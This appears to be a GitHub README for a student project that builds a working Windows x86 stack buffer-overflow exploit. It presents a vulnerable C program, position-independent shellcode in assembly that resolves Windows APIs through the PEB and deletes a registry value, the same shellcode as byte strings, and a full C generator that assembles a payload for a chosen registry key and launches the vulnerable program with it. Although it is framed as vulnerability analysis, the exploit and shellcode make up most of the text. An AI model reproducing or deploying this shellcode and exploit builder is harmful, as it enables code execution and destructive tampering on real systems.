# Buffer-overflow
## This git will analyze software vulnerabilities such as “buffer overflow” and prevent their exploitation.
A program vulnerable to “buffer overflow” was developed that takes a string as an argument and copies it to the buffer, a program was also developed that, according to the known size of the buffer of the vulnerable program, assembles the return address and the shell code and then launches the vulnerable program, passing as argument to the generated input string that causes a buffer overflow and deletion of the given registry key.

Buffer overflow is one of the most common software vulnerabilities that arise due to the lack of control of array boundaries by the compiler and the operating system.
A stack is a data structure in which the last object pushed on the stack is the first object to be popped off the stack. To access the stack segment, the stack pointer is used - the ESP register containing the address of the top of the stack. In the Intel architecture, the stack “grows” down, that is, memory addresses are used in the direction of decreasing address numbers.
In most programming languages, the stack is used when passing data to a called procedure. When a procedure is called (using the CALL instruction), the current value of the EIP register is pushed onto the stack, and at the end of the procedure (using the RET instruction), this value is restored, and the processor continues to work from the point where it stopped before calling the procedure.
A function is a piece of program code that is called, executed, and then returns to the previous execution process. If the function contains arguments, then memory is allocated on the stack for them.

Below is an example of a vulnerable program:
```
#include <stdio.h>
void victum(char* value) {
char string_for_cpy[8] = { NULL };
strcpy(string_for_cpy, value);
}

int main(int argc, char** argv) {
victum(argv[1]);
return EXIT_SUCCES;
}
```
To analyze the execution of this code, you need to view it in a disassembler (for example x32dbg), it will become clear that after executing the ret instruction, the program goes to an unknown address, which means we can conclude that the return address from the function has been overwritten.
Therefore, the main task is to pass such a string so that the return address points to the created shell code. To do this, you need to find the address of the call esp instruction.

Below is an example of a program that removes a key from the registry:
```
#include <stdio.h>
#include <Windows.h>

int main(void) {
	HINSTANCE hDLL = LoadLibrary(L"Advapi32.dll");
	if (hDLL == NULL) {
		return 1;
	}

	typedef LSTATUS(_stdcall* DeleteKey) (HKEY, LPCSTR, LPCSTR);

	DeleteKey deleteKey = (DeleteKey)GetProcAddress(hDLL, "RegDeleteKeyValueA");
	if (deleteKey == NULL) {
		return 1;
	}

	LSTATUS status = deleteKey(HKEY_CURRENT_USER, "Environment\\Test", "Value");
	FreeLibrary(hDLL);

	return status;
}
```
A program was created that removes specific fields in the registry.
The following steps are required to create this program:

1.Find where kernel32.dll is loaded into memory

2.Find its export table

3.Find GetProcAddress function exported by kernel32.dll

4.Use GetProcAddress to find the address of the LoadLibrary function

5.Use LoadLibrary to load Advapi32.dll library

6.Find the address of the SwapMouseButton function within Advapi32.dll

7.Call RegDeleteKeyValueA function

8.Find the address of the ExitProcess function

9.Call ExitProcess function
### Find kernel32.dll base address
```
xor ecx, ecx
mov eax, fs:[ecx + 0x30]  ; EAX = PEB
mov eax, [eax + 0xc]      ; EAX = PEB->Ldr
mov esi, [eax + 0x14]     ; ESI = PEB->Ldr.InMemOrder
lodsd                     ; EAX = Second module
xchg eax, esi             ; EAX = ESI, ESI = EAX
lodsd                     ; EAX = Third(kernel32)
mov ebx, [eax + 0x10]     ; EBX = Base address
```
(Lines 1-2) Let’s see what it does. It sets ecx register to zero and use it in the second instruction. But why? Remember when we talked about avoiding NULL bytes? The “mov eax,fs:[30]” instruction will be assembled in the following opcode sequence: “64 A1 30 00 00 00”, so we have null bytes, while “mov eax, fs:[ecx+0x30]” instruction will be assembled to “64 8B 41 30”. So this way it is possible to avoid NULL bytes.

(Lines 3-4) Now we have the PEB pointer in the eax register. As we see in the previous blog post, at the 0xC offset we can find the Ldr, we follow that pointer and in the Ldr at the 0x14 offset we have the “in memory order” modules list.

(Lines 5-7) We are now placed on the “program.exe” module, on the “InMemoryOrderLinks”. Here, first element is “Flink”, a pointer to the next module. You can see that we placed this pointer in the esi register. The “lodsd” instruction will follow the pointer specified by the esi register and we will have the result in the eax register. This means that after the lodsd instruction we will have the second module, ntdll.dll, in the eax register. We place this pointer in the esi by exchanging the values of eax and esi and use again the lodsd instruction to reach the 3rd module: kernel32.dll.

(Line 8) At this point, we have in the eax register, the pointer to “InMemoryOrderLinks” of kernel32.dll. Adding 0x10 bytes will give us the “DllBase” pointer, the address of memory where kernel32.dll is loaded. Target aquired!

### Find the export table of kernel32.dll
```
mov edx, [ebx + 0x3c] ; EDX = DOS->e_lfanew
add edx, ebx          ; EDX = PE Header
mov edx, [edx + 0x78] ; EDX = Offset export table
add edx, ebx          ; EDX = Export table
mov esi, [edx + 0x20] ; ESI = Offset names table
add esi, ebx          ; ESI = Names table
xor ecx, ecx          ; EXC = 0
```
(Lines 1-2) We know that we can find the “e_lfanew” pointer at the offset 0x3C, because the size of the MS-DOS header is 0x40 bytes and the last 4 bytes are the “e_lfanew” pointer. We add this value to the base address, because the pointer is relative to the base address (it is an offset).

(Lines 3-4) At the offset 0x78 of the PE header, we can find the “DataDirectory” for the exports. We know this because the size of all PE headers (Signature, FileHeader and OptionalHeader) before the DataDirectory is exactly 0x78 bytes and the export is the first entry in the DataDirectory table. Again, we add this value to the edx register and we are now placed on the export table of the kernel32.dll.

(Lines 5-7) In the IMAGE_EXPORT_DIRECTORY structure, at the offset 0x20 we can find the pointer to the “AddressOfNames” so we can get the exported function names. This is required because we try to find the function by its name even if it is  possible using some other methods. We save the pointer in the esi register and set ecx register to 0 (you will see below why).

### Find GetProcAddress function name
```
Get_Function:
 
inc ecx                              ; Increment the ordinal
lodsd                                ; Get name offset
add eax, ebx                         ; Get function name
cmp dword ptr[eax], 0x50746547       ; GetP
jnz Get_Function
cmp dword ptr[eax + 0x4], 0x41636f72 ; rocA
jnz Get_Function
cmp dword ptr[eax + 0x8], 0x65726464 ; ddre
jnz Get_Function
```
(Lines 1-3) First line “does nothing”. It is a label, a name for a location where we will jump in order to read of the function names, as you will see below. In line 3, we increment ecx register, which will be the counter of our functions and the function ordinal number.

(Lines 4-5) We have in the esi register, the pointer to the first function name. The lodsd instruction will place in eax the offset to the function name (e.g. “ExportedFunction”) and we add this with the ebx (kernel32 base address) in order to find the correct pointer. Note that the “lodsd” instruction will also increment the esi register value with 4! This helps us because we do not have to increment it manually, we just need to call again lodsd in order to get next function name pointer.

(Lines 6-11) We have now in the eax register a correct pointer to the exported function name. So there is a string containing the function name, we need to check if this function is “GetProcAddress”. In line 6, we compare the exported function name to “0x50746547” this being actually “50 74 65 47” ascii values meaning “PteG”. You may guess that reverse it is “GetP”, the first 4 bytes of the “GetProcAddress”, but x86 processors use little-endian method which means the numbers are stored in memory in reverse order of their bytes! So, we compare if the first 4 bytes of the current function name are “GetP”. If they are not, jnz instruction will jump again at our label and it will continue with the next function name. If it is, we also check the next 4 bytes, they must be “rocA” and next 4 bytes “ddre” in order to be sure we do not find other function that starts with “GetP”.

### Find the address of GetProcAddress function

```
mov esi, [edx + 0x24]    ; ESI = Offset ordinals
add esi, ebx             ; ESI = Ordinals table
mov cx, [esi + ecx * 2]  ; CX = Number of function
dec ecx
mov esi, [edx + 0x1c]    ; ESI = Offset address table
add esi, ebx             ; ESI = Address table
mov edx, [esi + ecx * 4] ; EDX = Pointer(offset)
add edx, ebx             ; EDX = GetProcAddress
```
(Lines 1-2) At this point we have in edx a pointer to the IMAGE_EXPORT_DIRECTORY structure. At the offset 0x24 of the structure we can find the “AddressOfNameOrdinals” offset. In line 2, we add this offset to ebx register which is the image base of the kernel32.dll so we get a valid pointer to the name ordinals table.

(Lines 3-4) The esi register contains the pointer to the name ordinals array. This array contains two byte numbers. We have the name ordinal number (index) of GetProcAddress function in the ecx register, so this way we get the function address ordinal (index). This will help us to get the function address. We have to decrement the number because the name ordinals starts from 0.

(Lines 5-6) At the offset 0x1c we cand find the “AddressOfFunctions”, the pointer to the function pointer array. We just add the image base of kernel32.dll and we are placed at the beginning of the array.

(Lines 7-8) Now that we have the correct index for the “AddressOfFunctions” array in ecx, we just find the GetProcAddress function pointer (relative to the image base) at the AddressOfFunctions[ecx] location. We use “ecx * 4” because each pointer has 4 bytes and esi points to the beginning of the array. In line 8, we add the image base so we will have in the edx the pointer to the GetProcAddress function. Target aquired!

### Find the LoadLibrary function address

```
xor ecx, ecx    ; ECX = 0
push ebx        ; Kernel32 base address
push edx        ; GetProcAddress
push ecx        ; 0
push 0x41797261 ; aryA
push 0x7262694c ; Libr
push 0x64616f4c ; Load
push esp        ; "LoadLibrary"
push ebx        ; Kernel32 base address
call edx        ; GetProcAddress(LL)
```
(Lines 1-3) First, we set ecx to zero because we will use it later. Second, lines two and three, we save on the stack, for future, the ebx which is the kernel32 base address and the edx which is the pointer to the GetProcAddress function.

(Lines 4-10) Now we have to make the following call: GetProcAddress(kernel32, “LoadLibraryA”). We have the kernel32 address, but how can we use a string? We will use again the stack. We will place the “LoadLibraryA\0” string on the stack. Yes, the string must be NULL terminated so this is why we set ecx to 0 and on line 4 we place it on the stack. We place the “LoadLibraryA” string on the stack 4 bytes at a time, in reverse order. We place first “aryA”, then “Libr” and then “Load” so the string on the stack will be “LoadLibraryA”. Done! Now, as we placed the data on the stack, the esp register, the stack pointer, will point to the beginning of our “LoadLibraryA” string. We now place the function parameters on the stack, from the last one to the first one, so first the esp in line 8, then the ebx, kernel32 base address on line 9 and we call edx which is the GetProcAddress pointer. And that’s all!

Note that we placed on the stack “LoadLibraryA”, not only “LoadLibrary”. This is because the kernel32.dll does not export a “LoadLibrary” function, instead it exports two functions: “LoadLibraryA” which is used for ANSI string parameters and “LoadLibraryW” which is used for Unicode string parameters.

### Load Advapi32.dll library
```
add esp, 0xc; pop "LoadLibrary"
pop ecx; ECX = 0
push eax; EAX = LoadLibrary
push ecx; 0
push 0x6c6c642e;.dll
push 0x32336970; pi32
push 0x61766441; Adva
push esp; "Advapi32.dll"
call eax; LoadLibrary("Advapi32.dll")
```
In this code fragment, similarly to the previous examples, the string is placed on the stack, while the previously introduced string is disposed of.

### Getting the address of the RegDeleteKeyValueA function
```
			add esp, 0x10; Clean stack
			mov edx, [esp + 0x4]; EDX = GetProcAddress
			xor ecx, ecx; ECX = 0
			push ecx
			xor ecx, ecx; ECX = 0 //need call GetProcAddress(advapi32.dll, «RegDeleteKeyValueA»)
			mov cx, 0x4165; eA
			push ecx
			push 0x756C6156; Valu
			push 0x79654B65; eKey
			push 0x74656C65; elet
			push 0x44676552; RegD
			push esp; "RegDeleteKeyValueA"
			push eax; Advapi32.dll address
			call edx; GetProc(RegDeleteKeyValueA)
```
### Pushing the main parameters of a function onto the stack

```
add esp, 0x14; Cleanup stack
push 0x616C6156; Vala
sub dword ptr[esp + 0x3], 0x61; Remove "a"
push 0x74736554; Test
mov ecx, 0x61746E65; enta
push ecx
sub dword ptr[esp + 0x3], 0x61; Remove "a"
push 0x6D6E6F72; ronm
push 0x69766E45; Envi
xor ecx, ecx
mov ecx, esp
add ecx, 0x0C
push ecx; Environment
xor ecx, ecx
mov ecx, esp
add ecx, 0x04
push ecx; TestVal
xor ecx, ecx
mov ecx, 0x81FFFF02
sub ecx, 0x01FFFF01 
push ecx; HKEY_CURRENT_USER
call eax; RegDeleteKeyValueA!
```
     
   Pushing onto the stack is similar, but special attention should be paid to the HKEY_CURRENT_USER constant, which is equal to 0x80000001. To get it, 0x81FFFF02 was initially placed in ecx, and then the number 0x01FFFF01 was subtracted. The conversion data was done in order to avoid null bytes.
   
In order to correctly exit the process, you need to find the ExitProcess function in kernel32.dll.
```
add esp, 0x1C; Clean stack
pop edx; GetProcAddress
pop ebx; kernel32.dll base address
mov ecx, 0x61737365; essa
push ecx
sub dword ptr[esp + 0x3], 0x61; Remove "a"
push 0x636f7250; Proc
push 0x74697845; Exit
push esp
push ebx; kernel32.dll base address
call edx; GetProc(Exec)
xor ecx, ecx; ECX = 0
push ecx; Return code = 0
call eax; ExitProcess
```
### Shell code in byte form

```
    victum("\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x31\x32\x33\x34\x01\x01\xE2\x2E\x75"
        "\x33\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58"
        "\x10\x8b\x53\x3c\x03\xd3\x8b\x52\x78\x03\xd3\x8b\x72\x20\x03\xf3\x33"
        "\xc9\x41\xad\x03\xc3\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72"
        "\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24"
        "\x03\xf3\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x03\xf3\x8b\x14\x8e\x03\xd3"
        "\x33\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c"
        "\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x59\x50\x51\x68\x2e\x64\x6c"
        "\x6c\x68\x70\x69\x33\x32\x68\x41\x64\x76\x61\x54\xff\xd0\x83\xc4\x10"
        "\x8b\x54\x24\x04\x33\xc9\x51\x33\xc9\x66\xb9\x65\x41\x51\x68\x56\x61"
        "\x6c\x75\x68\x65\x4b\x65\x79\x68\x65\x6c\x65\x74\x68\x52\x65\x67\x44"
        "\x54\x50\xff\xd2\x83\xc4\x14\x33\xc9\x51\x68\x74\x65\x73\x74\x68\x65"
        "\x6e\x74\x61\x83\x6c\x24\x03\x61\x68\x72\x6f\x6e\x6d\x68\x45\x6e\x76"
        "\x69\x33\xc9\x8b\xcc\x83\xc1\x0c\x51\x33\xc9\x8b\xcc\x83\xc1\x04\x51"
        "\x33\xc9\xb9\x02\xff\xff\x81\x81\xe9\x01\xff\xff\x01\x51\xff\xd0\x83"
        "\xc4\x1c\x5a\x5b\xb9\x65\x73\x73\x61\x51\x83\x6c\x24\x03\x61\x68\x50"
        "\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd2\x33\xc9\x51\xff\xd0\x22");
```
After passing the shell code as an input string, the return address is overwritten and control is transferred to the shell code.

Further, it was developed that, according to the known buffer size of the vulnerable program, assembles the return address and the shell code and then launches the vulnerable program, passing the generated input string as an argument, which causes a buffer overflow and deletion of the specified system registry key.

```
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

char* start = "1234\x91\xDF\x13\x76\x33\xC9\x64\x8B"           //Загружает билиотеки kernel
"\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B" // остается постоянный
"\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33"
"\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78"
"\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75"
"\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03"
"\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x53\x52\x51\x68\x61\x72\x79"
"\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2"
"\x83\xC4\x0C\x59\x50\x51\x68\x2E\x64\x6C\x6C\x68\x70\x69\x33"
"\x32\x68\x41\x64\x76\x61\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24"
"\x04\x33\xC9\x51\x33\xC9\x66\xB9\x65\x41\x51\x68\x56\x61\x6C"
"\x75\x68\x65\x4B\x65\x79\x68\x65\x6C\x65\x74\x68\x52\x65\x67"
"\x44\x54\x50\xFF\xD2\x83\xC4\x14";

/*"\x68\x56\x61\x6C\x61\x83\x6C"
"\x24\x03\x61\x68\x54\x65\x73\x74\xB9\x65\x6E\x74\x61\x51\x83"
"\x6C\x24\x03\x61\x68\x72\x6F\x6E\x6D\x68\x45\x6E\x76\x69"*/

char* push_pointer = "\x33\xC9\x8B\xCC\x83\xC1";    // пушит указатель на стек
/*"\x0C"*/

char* call_function = "\x51\x33\xC9\x8B\xCC\x83\xC1\x04\x51"   //вызвает функцию удаления
"\x33\xC9\xB9\x02\xFF\xFF\x81\x81\xE9\x01\xFF\xFF\x01\x51\xFF"
"\xD0\x83\xC4";

/*"\x1C"*/

char* end = "\x5A\x5B\xB9\x65\x73\x73\x61\x51\x83\x6C\x24"      //нахождение ф-ии exit_procces и выход
"\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF"
"\xD2\x33\xC9\x51\xFF\xD0";

char* convert_string_to_shellcode(char* string) {
	int len = strlen(string);
	char* shellcode = NULL;
	int remains = len % 4, commands_count = len / 4, i = 0;

	if (len < 4) {   //если длина меньше 4 то нужно дополнить до 4 и вычесть дополненное 
		shellcode = (char*)malloc(sizeof(char)*(1 + remains + 4 - remains + (4 - remains) * 5 + 1));
		if (shellcode == NULL) {
			return NULL;
		}
		*(shellcode) = '\x68'; // push
		i = 1;
		for (int j = 0; j < remains; i++, j++) {
			shellcode[i] = string[j];
		}
		for (int j = 0; j < 4 - remains; i++, j++) {
			shellcode[i] = '\x61'; // A
		}
		for (int j = 0; j < 4 - remains; j++) {
			shellcode[i++] = '\x83'; // sub
			shellcode[i++] = '\x6C'; // dword ptr
			shellcode[i++] = '\x24'; // esp
			shellcode[i++] = 3 - j;  // 
			shellcode[i++] = '\x61'; // A
		}
		shellcode[i] = 0;
		return shellcode;
	}
	if (remains == 0) { // если кратно четырем
		shellcode = (char*)malloc(sizeof(char) * (commands_count * 5 + 3 + 1));
		if (shellcode == NULL) {
			return NULL;
		}
		shellcode[0] = '\x33';		// xor
		shellcode[1] = '\xC9';		// ecx, ecx
		shellcode[2] = '\x51';	// push ecx
		i = 3;
	}
	else {										//push
		shellcode = (char*)malloc(sizeof(char) * (1 + remains + 4 - remains + (4 - remains) * 5 + commands_count * 5 + 1));
		if (shellcode == NULL) {
			return NULL;
		}
		shellcode[0] = '\x68'; // push
		i = 1;
		for (int j = 0; j < remains; i++, j++)
			shellcode[i] = string[commands_count * 4 + j];
		for (int j = 0; j < 4 - remains; i++, j++)
			shellcode[i] = '\x61'; // A
		for (int j = 0; j < 4 - remains; j++) {
			shellcode[i++] = '\x83'; // sub
			shellcode[i++] = '\x6C'; // dword ptr
			shellcode[i++] = '\x24'; // esp
			shellcode[i++] = 4 - 1 - j;
			shellcode[i++] = '\x61'; // A
		}

	}
	for (int k = commands_count - 1; k >= 0; k--) { //запись в стек в обратном порядке по 4 байта
		shellcode[i++] = '\x68'; // push
		for (int j = 0; j < 4; j++, i++) {
			shellcode[i] = string[k * 4 + j];
		}
	}
	shellcode[i] = 0;
	return shellcode;
}

int restrict_from_above(int size) {
	if (size % 4 == 0) {
		return size + 4; // because push 0x00000000 on stack
	}
	return size + 4 - (size % 4);
}

char* build_shellcode(char* victum_app, int buffer_size, char* key, int key_len, char* value, int value_len) {
	int len = strlen(victum_app) + 1 // путь до файла и пробел
		+ 2 + buffer_size + // две кавычки + размер буфера (8)
		strlen(start) + strlen(key) + strlen(value) + strlen(push_pointer) + 1 + strlen(call_function) + strlen(end) + 1 +1; // end character
	                   //путь до удаляемой папки и значение
	char* shellcode = (char*)malloc(sizeof(char) * len);
	if (shellcode == NULL) {
		return NULL;
	}

	int i = 0;
	for (int j = 0; j < strlen(victum_app); i++, j++) {
		shellcode[i] = victum_app[j];               //путь до уязвимого файла
	}
	shellcode[i++] = ' ';
	shellcode[i++] = '"';
	for (int j = 0; j < buffer_size; i++, j++) {
		shellcode[i] = 0xAA;    //начальное заполнение массива
	}
	for (int j = 0; j < strlen(start); i++, j++) {
		shellcode[i] = start[j];
	}
	for (int j = 0; j < strlen(value); i++, j++) {
		shellcode[i] = value[j];
	}
	for (int j = 0; j < strlen(key); i++, j++) {
		shellcode[i] = key[j];
	}
	for (int j = 0; j < strlen(push_pointer); i++, j++) {
		shellcode[i] = push_pointer[j];
	}
	shellcode[i++] = key_len;
	for (int j = 0; j < strlen(call_function); i++, j++) {
		shellcode[i] = call_function[j];
	}
	shellcode[i++] = 4 + key_len + 4 + value_len;
	for (int j = 0; j < strlen(end); i++, j++)
		shellcode[i] = end[j];

	shellcode[i++] = '"';
	shellcode[i++] = 0;
	return shellcode;
}

void print_hex(const char* string)
{
	unsigned char* p = (unsigned char*)string;

	for (int i = 0; i < strlen(string); ++i) {
		printf("\\x%02x", p[i]);
	}
	printf("\n\n");
}


// VICTUM.EXE 8 Environment\Test test
int main(int argc, char** argv) {
	char* victum_app = argv[1];
	int buffer_size = atoi(argv[2]);
	char* regestry_key = argv[3];
	char* regestry_value = argv[4];

	char* key = convert_string_to_shellcode(regestry_key);
	if (key == NULL) {
		printf("Can't allocate memory\n");
		return EXIT_FAILURE;
	}

	char* value = convert_string_to_shellcode(regestry_value);
	if (value == NULL) {
		printf("Can't allocate memory\n");
		return EXIT_FAILURE;
	}
	int size_for_registry_key = restrict_from_above(strlen(regestry_key));
	int size_for_registry_value = restrict_from_above(strlen(regestry_value));
	char* shellcode = build_shellcode(victum_app, buffer_size, key, size_for_registry_key, value, size_for_registry_value);
	if (shellcode == NULL) {
		printf("Can't allocate memory\n");
		return EXIT_FAILURE;
	}
	print_hex(shellcode + 12);

	UINT result_code = system(shellcode);

	free(key);
	free(value);
	free(shellcode);
	return EXIT_SUCCESS;
}
```
#### You can find more information on: https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/
